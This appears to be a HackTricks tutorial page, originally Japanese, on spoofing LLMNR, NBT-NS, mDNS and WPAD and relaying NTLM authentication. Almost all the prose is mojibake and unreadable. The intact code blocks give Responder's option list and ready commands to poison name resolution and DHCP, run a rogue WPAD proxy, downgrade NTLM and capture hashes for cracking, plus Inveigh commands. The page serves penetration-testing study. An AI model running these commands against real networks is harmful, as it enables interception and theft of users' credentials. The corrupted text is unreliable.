# LLMNRã€NBT-NSã€mDNS/DNSãŠã‚ˆã³WPADã®ã‚¹ãƒ—ãƒ¼ãƒ•ã‚£ãƒ³ã‚°ã¨ãƒªãƒ¬ãƒ¼ã‚¢ã‚¿ãƒƒã‚¯

<details>

<summary><strong>ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•ï¼š

- **HackTricksã§ä¼æ¥­ã‚’å®£ä¼ã—ãŸã„**ã¾ãŸã¯**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„**å ´åˆã¯ã€[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
- [**å…¬å¼PEASSï¼†HackTricksã‚¹ã‚¦ã‚§ã‚°**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’è¦‹ã¤ã‘ã‚‹
- **ğŸ’¬ [Discordã‚°ãƒ«ãƒ¼ãƒ—](https://discord.gg/hRep4RUj7f)**ã«å‚åŠ ã™ã‚‹ã‹ã€[telegramã‚°ãƒ«ãƒ¼ãƒ—](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter**ã§**@hacktricks_live**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã™ã‚‹
- **HackTricks**ãŠã‚ˆã³**HackTricks Cloud**ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹

</details>

## ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ãƒ—ãƒ­ãƒˆã‚³ãƒ«

### LLMNRã€NBT-NSã€ãŠã‚ˆã³mDNS

Microsoftã‚·ã‚¹ãƒ†ãƒ ã¯ã€DNSæ¤œç´¢ãŒå¤±æ•—ã—ãŸå ´åˆã«ãƒ­ãƒ¼ã‚«ãƒ«ãƒ›ã‚¹ãƒˆã®è§£æ±ºã«Link-Local Multicast Name Resolutionï¼ˆLLMNRï¼‰ãŠã‚ˆã³NetBIOS Name Serviceï¼ˆNBT-NSï¼‰ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚Apple BonjourãŠã‚ˆã³Linuxã‚¼ãƒ­æ§‹æˆå®Ÿè£…ã¯ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯å†…ã®ã‚·ã‚¹ãƒ†ãƒ ã‚’ç™ºè¦‹ã™ã‚‹ãŸã‚ã«ãƒãƒ«ãƒã‚­ãƒ£ã‚¹ãƒˆDNSï¼ˆmDNSï¼‰ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚ã“ã‚Œã‚‰ã®ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã¯èªè¨¼ã•ã‚Œãšã€UDPçµŒç”±ã§ãƒ–ãƒ­ãƒ¼ãƒ‰ã‚­ãƒ£ã‚¹ãƒˆãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã‚’é€ä¿¡ã™ã‚‹ãŸã‚ã€æ”»æ’ƒè€…ã¯ã“ã‚Œã‚‰ã‚’æ‚ªç”¨ã—ã¦ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’æ‚ªæ„ã®ã‚ã‚‹ã‚µãƒ¼ãƒ“ã‚¹ã«èª˜å°ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

Responderã‚’ä½¿ç”¨ã—ã¦ã€ãƒ›ã‚¹ãƒˆãŒæ¤œç´¢ã™ã‚‹ã‚µãƒ¼ãƒ“ã‚¹ã‚’å½ã®å¿œç­”ã‚’é€ä¿¡ã™ã‚‹ã“ã¨ã§å½è£…ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚\
[Responderã‚’ä½¿ç”¨ã—ãŸã‚µãƒ¼ãƒ“ã‚¹ã®å½è£…ã«é–¢ã™ã‚‹è©³ç´°æƒ…å ±ã¯ã“ã¡ã‚‰](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)ã‚’å‚ç…§ã—ã¦ãã ã•ã„ã€‚

### WPAD

å¤šãã®ãƒ–ãƒ©ã‚¦ã‚¶ã¯ã€Web Proxy Auto-Discoveryï¼ˆWPADï¼‰ã‚’ä½¿ç”¨ã—ã¦ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‹ã‚‰ãƒ—ãƒ­ã‚­ã‚·è¨­å®šã‚’èª­ã¿è¾¼ã¿ã¾ã™ã€‚WPADã‚µãƒ¼ãƒãƒ¼ã¯ã€æ¬¡ã®ã„ãšã‚Œã‹ã‚’é€šã˜ã¦ç‰¹å®šã®URLï¼ˆãŸã¨ãˆã°ã€_http://wpad.example.org/wpad.dat_ï¼‰ã‚’ä»‹ã—ã¦ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆãƒ—ãƒ­ã‚­ã‚·è¨­å®šã‚’æä¾›ã—ã¾ã™ã€‚

- DHCPã€ã‚³ãƒ¼ãƒ‰252ã‚¨ãƒ³ãƒˆãƒªã‚’ä½¿ç”¨[34](https://learning.oreilly.com/library/view/Network+Security+Assessment,+3rd+Edition/9781491911044/ch05.html#ch05fn41)
- ãƒ­ãƒ¼ã‚«ãƒ«ãƒ‰ãƒ¡ã‚¤ãƒ³ã§_wpad_ãƒ›ã‚¹ãƒˆåã‚’æ¤œç´¢ã™ã‚‹DNS
- Microsoft LLMNRãŠã‚ˆã³NBT-NSï¼ˆDNSæ¤œç´¢ãŒå¤±æ•—ã—ãŸå ´åˆï¼‰

Responderã¯WPADæ”»æ’ƒã‚’è‡ªå‹•åŒ–ã—ã€ãƒ—ãƒ­ã‚­ã‚·ã‚’å®Ÿè¡Œã—ã€DHCPã€DNSã€LLMNRã€ãŠã‚ˆã³NBT-NSã‚’ä»‹ã—ã¦ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã‚’æ‚ªæ„ã®ã‚ã‚‹WPADã‚µãƒ¼ãƒãƒ¼ã«èª˜å°ã—ã¾ã™ã€‚

## ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã®æ¯’å…¥ã‚Œ

### Responder - LLMNRã€NBT-NSã€ãŠã‚ˆã³MDNS

> Responderã¯LLMNRã€NBT-NSã€ãŠã‚ˆã³MDNSã®æ¯’å…¥ã‚Œãƒ„ãƒ¼ãƒ«ã§ã™ã€‚åå‰æ¥å°¾è¾ã«åŸºã¥ã„ã¦ç‰¹å®šã®NBT-NSï¼ˆNetBIOS Name Serviceï¼‰ã‚¯ã‚¨ãƒªã«å¿œç­”ã—ã¾ã™ï¼ˆå‚ç…§ï¼š[http://support.microsoft.com/kb/163409](http://support.microsoft.com/kb/163409)ï¼‰ã€‚ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ã€ã“ã®ãƒ„ãƒ¼ãƒ«ã¯SMBç”¨ã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚µãƒ¼ãƒãƒ¼ã‚µãƒ¼ãƒ“ã‚¹ãƒªã‚¯ã‚¨ã‚¹ãƒˆã«ã®ã¿å¿œç­”ã—ã¾ã™ã€‚
>
> ã“ã®èƒŒå¾Œã«ã‚ã‚‹ã‚³ãƒ³ã‚»ãƒ—ãƒˆã¯ã€ç§ãŸã¡ã®å›ç­”ã‚’ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã«ã™ã‚‹ã“ã¨ã§ã‚ã‚Šã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ä¸Šã§ã‚¹ãƒ†ãƒ«ã‚¹æ€§ã‚’æŒãŸã›ã‚‹ã“ã¨ã§ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€åˆæ³•çš„ãªNBT-NSã®å‹•ä½œã‚’å£Šã•ãªã„ã‚ˆã†ã«ã™ã‚‹ã®ã«ã‚‚å½¹ç«‹ã¡ã¾ã™ã€‚

- [**Responder**](https://github.com/lgandx/Responder)ã¯kaliã«ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã•ã‚Œã¦ãŠã‚Šã€æ§‹æˆãƒ•ã‚¡ã‚¤ãƒ«ã¯\*\*`/etc/responder/Responder.conf` \*\*ã«ã‚ã‚Šã¾ã™ï¼ˆã“ã“ã§ãƒ­ãƒ¼ã‚°ã‚µãƒ¼ãƒãƒ¼ã‚’ç„¡åŠ¹ã«ã§ãã¾ã™ï¼‰
- **Responder**ã¯**ç”»é¢ã«ãƒãƒƒã‚·ãƒ¥ã‚’è¡¨ç¤º**ã—ã€ãƒ›ã‚¹ãƒˆã”ã¨ã«`/usr/share/responder/logs`ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã«ã‚ã‚‹ãƒ­ã‚°ãƒ•ã‚¡ã‚¤ãƒ«ã«æ›¸ãè¾¼ã¿ã¾ã™ã€‚ãƒãƒƒã‚·ãƒ¥ã¯`(MODULE_NAME)-(HASH_TYPE)-(CLIENT_IP).txt`å½¢å¼ã§ä¿å­˜ã•ã‚Œã¾ã™
- **Windows**ç”¨ã®Responderã¯[ã“ã¡ã‚‰](https://github.com/lgandx/Responder-Windows)ã§è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™
- Responderã¯**ipv4**ãŠã‚ˆã³**ipv6**ã§å‹•ä½œã—ã¾ã™

#### Responderãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿

Responderã¯ä»¥ä¸‹ã®ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚’ã‚µãƒãƒ¼ãƒˆã—ã¦ã„ã¾ã™:
```
--version           show program's version number and exit
-h, --help          show this help message and exit
-A, --analyze       Analyze mode. This option allows you to see NBT-NS,
BROWSER, LLMNR requests without responding.
-I eth0, --interface=eth0
Network interface to use, you can use 'ALL' as a
wildcard for all interfaces
-i 10.0.0.21, --ip=10.0.0.21
Local IP to use (only for OSX)
-6 2002:c0a8:f7:1:3ba8:aceb:b1a9:81ed, --externalip6=2002:c0a8:f7:1:3ba8:aceb:b1a9:81ed
Poison all requests with another IPv6 address than
Responder's one.
-e 10.0.0.22, --externalip=10.0.0.22
Poison all requests with another IP address than
Responder's one.
-b, --basic         Return a Basic HTTP authentication. Default: NTLM
-r, --wredir        Enable answers for netbios wredir suffix queries.
Answering to wredir will likely break stuff on the
network. Default: False
-d, --DHCP          Enable answers for DHCP broadcast requests. This
option will inject a WPAD server in the DHCP response.
Default: False
-D, --DHCP-DNS      This option will inject a DNS server in the DHCP
response, otherwise a WPAD server will be added.
Default: False
-w, --wpad          Start the WPAD rogue proxy server. Default value is
False
-u UPSTREAM_PROXY, --upstream-proxy=UPSTREAM_PROXY
Upstream HTTP proxy used by the rogue WPAD Proxy for
outgoing requests (format: host:port)
-F, --ForceWpadAuth Force NTLM/Basic authentication on wpad.dat file
retrieval. This may cause a login prompt. Default:
False
-P, --ProxyAuth     Force NTLM (transparently)/Basic (prompt)
authentication for the proxy. WPAD doesn't need to be
ON. This option is highly effective when combined with
-r. Default: False
--lm                Force LM hashing downgrade for Windows XP/2003 and
earlier. Default: False
--disable-ess       Force ESS downgrade. Default: False
-v, --verbose       Increase verbosity.
```
<details>

<summary>Responder ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿</summary>

* `-A` ãƒ•ãƒ©ã‚°ã¯**è§£æãƒ¢ãƒ¼ãƒ‰**ã«å…¥ã‚Šã€ç’°å¢ƒå†…ã® NBT-NSã€BROWSERã€ãŠã‚ˆã³ LLMNR ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’æ¯’åŒ–ã›ãšã«è¡¨ç¤ºã§ãã¾ã™ã€‚
* å¿…ãšã‚¤ãƒ³ã‚¿ãƒ¼ãƒ•ã‚§ãƒ¼ã‚¹ã¾ãŸã¯ IP ã‚’æŒ‡å®šã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚
* `-wf` ã¯ WPAD ãƒ­ãƒ¼ã‚°ãƒ—ãƒ­ã‚­ã‚·ã‚µãƒ¼ãƒãƒ¼ã‚’èµ·å‹•ã—ã¾ã™ã€‚
* `-f` ã¯ãƒªãƒ¢ãƒ¼ãƒˆãƒ›ã‚¹ãƒˆã®ã‚ªãƒšãƒ¬ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ã‚·ã‚¹ãƒ†ãƒ ã¨ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚’ç‰¹å®šã—ã‚ˆã†ã¨ã—ã¾ã™ã€‚
* è¿½åŠ ã®ãƒ‡ãƒ¼ã‚¿ãŒã‚³ãƒ³ã‚½ãƒ¼ãƒ«ã«è¡¨ç¤ºã•ã‚Œã‚‹ãŸã‚ã€`-v` ãƒ•ãƒ©ã‚°ã‚’ä½¿ç”¨ã—ã¦å†—é•·æ€§ã‚’å¢—ã‚„ã—ã¾ã™ã€‚
* `-F` ã‚„ `-P` ãªã©ã®ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚’ä½¿ç”¨ã—ã¦ NTLM ã¾ãŸã¯ Basic èªè¨¼ã‚’å¼·åˆ¶ã—ãŸã‚Šã€ãƒ—ãƒ­ã‚­ã‚·èªè¨¼ã‚’å¼·åˆ¶ã—ãŸã‚Šã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ãŒã€ãƒ­ã‚°ã‚¤ãƒ³ãƒ—ãƒ­ãƒ³ãƒ—ãƒˆãŒè¡¨ç¤ºã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚‹ãŸã‚ã€æ…é‡ã«ä½¿ç”¨ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚
* `-w` ãƒ•ãƒ©ã‚°ã¯çµ„ã¿è¾¼ã¿ã® WPAD ãƒ—ãƒ­ã‚­ã‚·ã‚µãƒ¼ãƒãƒ¼ã‚’åˆ©ç”¨ã—ã¾ã™ã€‚ã“ã‚Œã¯ç‰¹ã«å¤§è¦æ¨¡ãªçµ„ç¹”ã§ã¯éå¸¸ã«åŠ¹æœçš„ã§ã‚ã‚Šã€Internet Explorer ã‚’èµ·å‹•ã™ã‚‹ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒ [Auto-detect settings](https://docs.microsoft.com/en-us/internet-explorer/ie11-deploy-guide/auto-detect-settings-for-ie11) ã‚’æœ‰åŠ¹ã«ã—ã¦ã„ã‚‹å ´åˆã€ã™ã¹ã¦ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã® HTTP ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’ã‚­ãƒ£ãƒ—ãƒãƒ£ã—ã¾ã™ã€‚

</details>

#### Responder ã®å®Ÿè¡Œ

Responder ã®ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆå‹•ä½œã‚’å®Ÿè¡Œã™ã‚‹ã«ã¯ã€æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ã ã‘ã§ã™ã€‚
```bash
responder -I <Iface> #Default conf
responder -I <Iface> -P -r -v #More chances but might break things
```
**æ—¥æœ¬èªè¨³:**
èˆˆå‘³æ·±ã„ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã¯ã€å¯èƒ½ãªé™ã‚ŠResponderã‚’ä½¿ç”¨ã—ã¦NTLMèªè¨¼ã‚’ãƒ€ã‚¦ãƒ³ã‚°ãƒ¬ãƒ¼ãƒ‰ã™ã‚‹ã“ã¨ã§ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€**NTLMv2ã§ã¯ãªã** **ç°¡å˜ã«ã‚¯ãƒ©ãƒƒã‚¯ã§ãã‚‹**NTLMv1ã®ãƒãƒ£ãƒ¬ãƒ³ã‚¸ã¨ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã‚’**ã‚­ãƒ£ãƒ—ãƒãƒ£**ã§ãã¾ã™[**ã“ã®ã‚¬ã‚¤ãƒ‰ã«å¾“ã£ã¦**](../../windows-hardening/ntlm/#ntlmv1-attack)**ã€‚**
```bash
#Remember that in order to crack NTLMv1 you need to set Responder challenge to "1122334455667788"
responder -I <Iface> --lm --disable-ess #Downgrade NTLM authntication if possible and force ESS downgrade
```
ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ã€**WPADã®å½è£…ã¯å®Ÿè¡Œã•ã‚Œã¾ã›ã‚“**ãŒã€æ¬¡ã®ã‚ˆã†ã«å®Ÿè¡Œã§ãã¾ã™ï¼š
```bash
responder -I <Iface> --wpad
```
ã‚ãªãŸã®IPã§NetBIOSãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’è§£æ±ºã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚ãã—ã¦ã€èªè¨¼ãƒ—ãƒ­ã‚­ã‚·ã‚’ä½œæˆã—ã¾ã™ï¼š
```bash
responder.py -I <interface> -Pv
```
NTLMãƒãƒƒã‚·ãƒ¥ã‚’å‚å—ã™ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“ï¼ˆé€šå¸¸ï¼‰ã€ã—ã‹ã—ã€ä¾‹ãˆã°`--format=netntlmv2`ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚’ä½¿ç”¨ã—ã¦**NTLMãƒãƒ£ãƒ¬ãƒ³ã‚¸ã¨ãƒ¬ã‚¹ãƒãƒ³ã‚¹**ã‚’ç°¡å˜ã«å–å¾—ã—ã€**ã‚¯ãƒ©ãƒƒã‚¯**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®_**Responder**_ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã®**ãƒ­ã‚°ã¨ãƒãƒ£ãƒ¬ãƒ³ã‚¸**ã¯ã€kaliã®`/usr/share/responder/logs`ã«ã‚ã‚Šã¾ã™ã€‚

#### Responder - DHCPãƒã‚¤ã‚ºãƒ‹ãƒ³ã‚°

Windowsã¯NetBIOSã€WINSã€WPADè¨­å®šãªã©ã®ã‚«ã‚¹ã‚¿ãƒ DHCPã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚’è¤‡æ•°ä½¿ç”¨ã—ã¾ã™ã€‚ãƒ¯ãƒ¼ã‚¯ã‚¹ãƒ†ãƒ¼ã‚·ãƒ§ãƒ³ãŒãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯è¨­å®šã‚’å–å¾—ã™ã‚‹ãŸã‚ã«DHCPãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹ã¨ãã€ã“ã‚Œã‚‰ã®è¿½åŠ è¨­å®šã¯DHCPå¿œç­”ã«å«ã¾ã‚Œã€ç°¡å˜ãªæ¥ç¶šã¨åå‰è§£æ±ºã‚’å®¹æ˜“ã«ã—ã¾ã™ã€‚

DHCPå¿œç­”ã‚’ã‚¹ãƒ—ãƒ¼ãƒ•ã‚£ãƒ³ã‚°ã—ã¦ã‚‚ã€ãƒ¯ãƒ¼ã‚¯ã‚¹ãƒ†ãƒ¼ã‚·ãƒ§ãƒ³ã®ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯æ§‹æˆã«å¹²æ¸‰ã™ã‚‹ãŸã‚ã€ä¸­æ–­ãªã—ã§è¡Œã†ã“ã¨ã¯é›£ã—ã„å ´åˆãŒã‚ã‚Šã¾ã™ã€‚é€šå¸¸ã€ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã‚µãƒ–ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã®DNSã‚µãƒ¼ãƒãƒ¼ã€ã‚¹ã‚¤ãƒƒãƒã€ãƒ«ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ãƒ†ãƒ¼ãƒ–ãƒ«ã€ãƒ‰ãƒ¡ã‚¤ãƒ³ã€ãƒãƒƒãƒˆãƒã‚¹ã‚¯ã€DHCPã‚µãƒ¼ãƒãƒ¼ãªã©ã«ã¤ã„ã¦éå¸¸ã«è‰¯ã„çŸ¥è­˜ãŒå¿…è¦ã§ã™ã€‚**ã“ã‚Œã‚‰ã®è¨­å®šã«èª¤ã‚ŠãŒã‚ã‚‹ã¨ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã«ä¸­æ–­ãŒç™ºç”Ÿã—ã¾ã™ã€‚**

ãŸã ã—ã€DHCPå¿œç­”ã‚’ã‚¹ãƒ—ãƒ¼ãƒ•ã‚£ãƒ³ã‚°ã™ã‚‹ã“ã¨ã«ã¯ç‹¬è‡ªã®åˆ©ç‚¹ãŒã‚ã‚Šã¾ã™ã€‚ARPãƒã‚¤ã‚ºãƒ‹ãƒ³ã‚°ã‚ˆã‚Šã‚‚**ç¢ºå®Ÿã«ã‚¹ãƒ†ãƒ«ã‚¹**ã§ã™ã€‚ãƒ¦ãƒ‹ã‚­ãƒ£ã‚¹ãƒˆå¿œç­”1ã¤ã§è¢«å®³è€…ã®ãƒ«ãƒ¼ãƒ†ã‚£ãƒ³ã‚°æƒ…å ±ã‚’æ°¸ä¹…ã«ãƒã‚¤ã‚ºãƒ³ã™ã‚‹ã“ã¨ãŒã§ãã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ä¸Šã§è¤‡æ•°ã®DHCPã‚µãƒ¼ãƒãƒ¼ãŒå‹•ä½œã—ã¦ã„ã‚‹ã“ã¨ã‚‚ä¸€èˆ¬çš„ã§ã™ã€‚ãƒ¦ãƒ‹ã‚­ãƒ£ã‚¹ãƒˆDHCPå¿œç­”ã¯æ¤œå‡ºãŒã‚ˆã‚Šè¤‡é›‘ã§ã™ã€‚ä¸€éƒ¨ã®ã‚¹ã‚¤ãƒƒãƒã¯DHCPã‚¹ãƒŒãƒ¼ãƒ”ãƒ³ã‚°ã‚’é˜²ããŸã‚ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£è¨­å®šã‚’æä¾›ã—ã¾ã™ãŒã€ã“ã‚Œã‚‰ã®è¨­å®šã¯ç›´æ„Ÿçš„ã§ã¯ãªãã€æœ‰åŠ¹ã«ãªã£ã¦ã„ã‚‹ã¨ãã«ã—ã°ã—ã°èª¤ã£ã¦æ§‹æˆã•ã‚Œã¦ã„ã¾ã™ã€‚

> ã“ã®æ”»æ’ƒã¯éå¸¸ã«åŠ¹æœçš„ã§ã€ç¢ºå®Ÿã«NTLMv1/2ãƒãƒƒã‚·ãƒ¥ã‚’å–å¾—ã§ãã¾ã™ã€‚
```bash
./Responder.py -I eth0 -Pdv
```
#### Responder - è³‡æ ¼æƒ…å ±ã®ã‚­ãƒ£ãƒ—ãƒãƒ£

Responderã¯ã€**è¨€åŠã•ã‚ŒãŸãƒ—ãƒ­ãƒˆã‚³ãƒ«ã‚’ä½¿ç”¨ã—ã¦ã™ã¹ã¦ã®ã‚µãƒ¼ãƒ“ã‚¹ã‚’å½è£…**ã—ã¾ã™ã€‚ã“ã‚Œã‚‰ã®ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã‚’ä½¿ç”¨ã—ã¦è§£æ±ºã•ã‚ŒãŸã‚µãƒ¼ãƒ“ã‚¹ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã‚ˆã†ã¨ã™ã‚‹ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒã„ã‚‹ã¨ã€**å½¼ã¯Responderã«å¯¾ã—ã¦èªè¨¼ã‚’è©¦ã¿**ã€Responderã¯ãŠãã‚‰ã**NTLMv2ãƒãƒ£ãƒ¬ãƒ³ã‚¸/ãƒ¬ã‚¹ãƒãƒ³ã‚¹**ã‚’"ã‚­ãƒ£ãƒ—ãƒãƒ£"ã§ãã¾ã™ã€‚

NetNTLMv1ã«ãƒ€ã‚¦ãƒ³ã‚°ãƒ¬ãƒ¼ãƒ‰ã—ãŸã‚Šã€ESSã‚’ç„¡åŠ¹ã«ã—ãŸã‚Šã™ã‚‹ã“ã¨ã‚‚å¯èƒ½ã§ã™ã€‚

![](<../../.gitbook/assets/poison (1) (1) (1).jpg>)

### Inveigh - C#/PowerShell Responder

> Inveighã¯ã€Windowsã‚·ã‚¹ãƒ†ãƒ ã«åˆ¶é™ã•ã‚Œã¦ã„ã‚‹ãƒšãƒãƒˆãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ãƒ†ã‚¹ã‚¿ãƒ¼/ãƒ¬ãƒƒãƒ‰ãƒãƒ¼ãƒãƒ¼ã‚’æ”¯æ´ã™ã‚‹ãŸã‚ã«è¨­è¨ˆã•ã‚ŒãŸPowerShell ADIDNS/LLMNR/NBNS/mDNS/DNSã‚¹ãƒ—ãƒ¼ãƒ•ã‚¡ãƒ¼ãŠã‚ˆã³ä¸­é–“è€…ãƒ„ãƒ¼ãƒ«ã§ã™ã€‚

[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh)ã¯ã€PowerShellã‚¹ã‚¯ãƒªãƒ—ãƒˆã§ã—ãŸãŒã€ç¾åœ¨ã¯åŒã˜ä¸»è¦æ©Ÿèƒ½ã‚’æŒã¤C#ãƒã‚¤ãƒŠãƒªã§ã™ã€‚[**ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿**](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters)ã‚’ãƒªã‚¹ãƒˆã‚¢ãƒƒãƒ—ã—ã€ä½¿ç”¨æ–¹æ³•ã®æŒ‡ç¤ºã‚’ç¤ºã™[**wiki**]ãŒã‚ã‚Šã¾ã™ã€‚\
åˆ¥ã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã¯[**InveighZero**](https://github.com/Kevin-Robertson/InveighZero)ã§è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

![](../../.gitbook/assets/45662029-1b5e6300-bace-11e8-8180-32f8d377d48b.png)

ã¾ãŸã¯ã€ã•ã‚‰ã«å¤šãã®ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚’ä½¿ç”¨ã—ã¦å®Ÿè¡Œã—ã¾ã™ï¼š
```powershell
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```
ã¾ãŸã¯ã€C#ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚’å®Ÿè¡Œã—ã¾ã™ï¼š
```bash
Inveigh.exe
```
## NTLM Relay Attack

ã“ã®æ”»æ’ƒã¯ã€å†…éƒ¨ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ä¸Šã®**ã‚¿ãƒ¼ã‚²ãƒƒãƒˆãƒã‚·ãƒ³**ã«**SMBèªè¨¼ã‚»ãƒƒã‚·ãƒ§ãƒ³**ã‚’ä¸­ç¶™ã—ã¾ã™ã€‚èªè¨¼**ã‚»ãƒƒã‚·ãƒ§ãƒ³ãŒæˆåŠŸã™ã‚‹**ã¨ã€è‡ªå‹•çš„ã«**ã‚·ã‚¹ãƒ†ãƒ **ã®**ã‚·ã‚§ãƒ«**ã«ç§»è¡Œã—ã¾ã™ã€‚ä¸­ç¶™ã•ã‚Œã‚‹èªè¨¼ã¯ã€ä¸­ç¶™ã•ã‚Œã‚‹ãƒ›ã‚¹ãƒˆã«**ãƒ­ãƒ¼ã‚«ãƒ«ç®¡ç†è€…ã‚¢ã‚¯ã‚»ã‚¹æ¨©ã‚’æŒã¤ãƒ¦ãƒ¼ã‚¶ãƒ¼**ã‹ã‚‰ã§ã‚ã‚‹å¿…è¦ãŒã‚ã‚Šã€ã‹ã¤**SMBç½²åãŒç„¡åŠ¹ã«ãªã£ã¦ã„ã‚‹**å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

### 445ã®è»¢é€ã¨ãƒˆãƒ³ãƒãƒªãƒ³ã‚°

{% hint style="warning" %}
ã‚‚ã—ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯å†…ã«**ãƒã‚·ãƒ³ã‚’å°å…¥ã§ãã‚‹**å ´åˆã€ä»¥ä¸‹ã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã®**ãƒ„ãƒ¼ãƒ«**ã®ã„ãšã‚Œã‹ã‚’ä½¿ç”¨ã—ã¦ä¸­ç¶™æ”»æ’ƒã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã€ã“ã‚Œã«ã¤ã„ã¦å¿ƒé…ã™ã‚‹å¿…è¦ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚
{% endhint %}

